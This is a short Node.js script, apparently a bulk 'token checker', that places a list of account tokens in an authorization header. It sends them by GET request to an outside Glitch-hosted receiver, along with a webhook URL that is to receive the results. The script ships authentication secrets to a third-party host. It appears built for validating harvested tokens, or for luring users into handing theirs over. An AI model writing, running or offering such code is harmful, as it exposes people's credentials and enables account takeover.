const fetch = require('node-fetch');
const tokens = [
	'token 1',
	'token 2',
	'token 3',
	'token 4',
	'token 5',
	'token 6'
	];
const webhook = 'link completo do webhook para receber as informações da token';

fetch(`https://check-tokens.glitch.me/receiver`, {
		method: 'GET',
		headers: {
			authorization: tokens,
			webhook: webhook
		}
})
